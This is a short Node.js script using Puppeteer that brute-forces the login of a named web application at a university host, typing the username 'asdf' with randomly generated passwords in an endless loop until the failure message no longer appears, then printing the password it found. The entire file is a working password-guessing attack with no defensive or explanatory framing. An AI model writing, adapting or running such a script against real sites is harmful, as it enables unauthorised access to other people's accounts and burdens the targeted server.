const puppeteer = require('puppeteer');
const generator = require('generate-password');


const PAGE_URL = 'http://luffy.ee.ncku.edu.tw:11550';
const PLAY_SELECTOR = '#play_button > i'

const ID_INPUT = '#loginNameInput'
const PW_INPUT = '#loginPassInput'
const LOGIN = '#login_button'

const FAIL = '#close_message_modal'

const USERNAME = 'asdf';

(async () => {
    const browser = await puppeteer.launch({
        headless: !(process.env.HEADLESS == 'false')
    });
    const page = await browser.newPage();

    while (true) {
        var password = generator.generate({
            length: Math.floor(Math.random() * Math.floor(15)),
            numbers: true
        });

        await page.goto(PAGE_URL);
        await page.click(PLAY_SELECTOR)
        await page.click(ID_INPUT)
        await page.keyboard.type(USERNAME)
        await page.click(PW_INPUT)
        await page.keyboard.type(password)
        await page.click(LOGIN)

        await page.waitFor(3000)

        if (await page.$(FAIL) !== null) {
            //console.log('FAIL', password)
            await page.click(FAIL)
        } else {
            break
        }
    }
    console.log('FOUND:', password)

})();
